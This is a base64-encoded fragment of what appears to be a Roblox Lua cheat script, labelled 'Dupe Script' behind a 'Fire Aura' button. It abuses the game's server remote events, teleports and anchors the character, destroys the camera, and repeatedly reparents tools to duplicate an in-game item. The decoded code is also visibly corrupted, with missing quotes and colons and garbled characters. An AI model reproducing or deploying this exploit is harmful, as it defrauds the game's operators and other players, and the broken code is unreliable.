sYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZSByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKURlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSBQaWNraW5nVG9vbHMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzJdID0gdG9vbHRoYXRpd2FudHRvZHVwZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBwaWNrdG9vbHJlbW90ZUludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkJhY2twYWNrV2FpdEZvckNoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB3YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW3Rvb2x0aGF0aXdhbnR0b2R1cGVdRmluZEZpcnN0Q2hpbGQoSGFuZGxlKS5OYW1lID0gSMOiwiDCpWHDosIgwqVuw6LCIMKlZMOiwiDCpWzDosIgwqVlCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFja0ZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0ICAgICAgICAgICAgICAgICBpZiBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkgZW5kIHdhaXQoKSB1bnRpbCBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKSA9PSBuaWwKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpID09IG5pbAogICAgICAgICAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkKICAgICAgICAgICAgICAgIHRvb2xncmlwID0gdHJ1ZQogICAgICAgICAgICAgICAgZHVwaW5nID0gZmFsc2UKICAgICAgICAgICAgICAgIHdhaXQoKQpsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWRXYWl0KCkKbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpCgoKcHJpbnQoZG9uZSkKd2FpdCgxKQpsb2NhbCBHcmlwUG9zVGFibGUgPSB7CiAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIDApLAogIFZlY3RvcjMubmV3KDMwLCAwLCAwKSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIDApLAogIFZlY3RvcjMubmV3KDYwLCAwLCAwKSwgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIDApLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIDApLAogIFZlY3RvcjMubmV3KC00MCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIDApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDEwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygzMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDQwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0wLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDEwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDQwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0wLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDEwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDQwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgMTUpLCAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIDE1KSwKVmVjdG9yMy5uZXcoMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygxMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygyMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgLTE1KSwgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC01MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygyMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygzMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgLTMwKSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtMzApLAogICAgVmVjdG9yMy5uZXcoMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygyMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgLTQ1KSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtNDUpLAogICAgVmVjdG9yMy5uZXcoMTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC02MCksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygyMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgLTc1KSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtNzUpLAoKCiAgICAgfQogICAgICBmb3IgaSwgdG9vbCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgaWYgdG9vbElzQShUb29sKSB0aGVuCiAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgbG9jYWwgZ3JpcFBvc0luZGV4ID0gbWF0aC5taW4oaSwgI0dyaXBQb3NUYWJsZSkKICAgICAgICAgICAgICBsb2NhbCBncmlwUG9zID0gR3JpcFBvc1RhYmxlW2dyaXBQb3NJbmRleF0KICAgICAgICAgICAgICAKICAgICAgICAgICAgICBpZiB0b29sSXNEZXNjZW5kYW50T2YoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcikgdGhlbgogICAgICAgICAgICAgICAgICB0b29sLkdyaXBQb3MgPSBncmlwUG9zCiAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICB3YXJuKFRvb2wsIHRvb2wuTmFtZSwgaXMgbm90IGluIGNoYXJhY3RlcikKICAgICAgICAgICAgICBlbmQKICAgICAgICAgIGVuZAogICAgICBlbmQgICAgICAgICAgIAogICAgZW5kCn0pCgotLSBCdXR0b24gZm9yIEZpcmUgQXVyYQpUb29sc1RhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gRmlyZSBBdXJhLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbmFtZXRvb2xzID0gZmlyZSBTcHJheSBsZWwKICAgICAgICAgICAgICAgIG9sZGNmcmFtZSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKZ2FtZUdldFNlcnZpY2UoU3RhcnRlckd1aSlTZXRDb3JlKFNlbmROb3RpZmljYXRpb24se1RpdGxlPUR1cGUgU2NyaXB0LFRleHQ9UGxlYXNlIGRvIG5vdCBlcXVpcCBhbnkgdG9vbHMgb3IgdW5lcXVpcCB0b29scyBvciBjbGljayB0b29scyBvbiBpbnZlbnRvcnkuIEl0IHdpbGwgYnJlYWsgdGhlIHNjcmlwdC4sIEJ1dHRvbjEgPSBJIHVuZGVyc3RhbmQgLER1cmF0aW9uPTV9KQogICAgICAgICAgICAgICAgdG9vbHRoYXRpd2FudHRvZHVwZSA9IFBhcGVyYmFnRmlyZQogICAgICAgICAgICAgICAgdG9vbHMgPSBQYXBlcmJhZ0ZpcmUKICAgICAgICAgICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID09IHRydWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9IGZhbHNlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHdhaXQoMC4xKQogICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgWzFdID0gQ2xlYXJBbGxUb29scwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBjbGVhcnRvb2xyZW1vdGVGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgIGlmIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICBmb3IgbT0xLDIgZG8gdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OTk5OTk5LjQxNCwgLTQ5MCwgOTk5OTk5OTk5LjQxNCwgMC45NzQzNjA0MDYsIC0wLjE3NTczNDA4OCwgMC4xNDA0OTc2MSwgLTAuMTMzNDQxNDA0LCAwLjA1MTQwNTMwNjksIDAuOTg5NzIyNzI5LCAtMC4xODExNTAzMDIsIC0wLjk4MzA5NDY5MiwgMC4wMjY2MzcwOTIyKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgICAgICAgICAgd2FpdCgwLjMpCiAgICAgICAgICAgICAgICBkdXBpbmcgPSB0cnVlCiAgICAgICAgICAgICAgICBmb3IgbT0xLCAxMjQgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzFdID0gUGlja2luZ1Rvb2xzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsyXSA9IHRvb2x0aGF0aXdhbnR0b2R1cGUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgcGlja3Rvb2xyZW1vdGVJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFja1dhaXRGb3JDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3Rlclt0b29sdGhhdGl3YW50dG9kdXBlXUZpbmRGaXJzdENoaWxkKEhhbmRsZSkuTmFtZSA9IEjDosIgwqVhw6LCIMKlbsOiwiDCpWTDosIgwqVsw6LCIMKlZQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCAgICAgICAgICAgICAgICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpRGVzdHJveSgpIGVuZCB3YWl0KCkgdW50aWwgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkgPT0gbmlsCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KSA9PSBuaWwKICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgICAgICAgICB0b29sZ3JpcCA9IHRydWUKICAgICAgICAgICAgICAgIGR1cGluZyA9IGZhbHNlCiAgICAgICAgICAgICAgICB3YWl0KCkKbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkV2FpdCgpCmxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKQoKCnByaW50KGRvbmUpCndhaXQoMSkKbG9jYWwgR3JpcFBvc1RhYmxlID0gewogICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIDApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygzMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIDApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAwKSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgMCksICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIDApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIDApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygtMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC00MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC02MCwgMCwgMzApLAogICAgICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygxMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDIwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDUwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygtMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC01MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygxMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDIwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDUwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDE1KSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAxNSksClZlY3RvcjMubmV3KDAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC0xNSksICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KDAsIDAsIC0zMCksCiAgVmVjdG9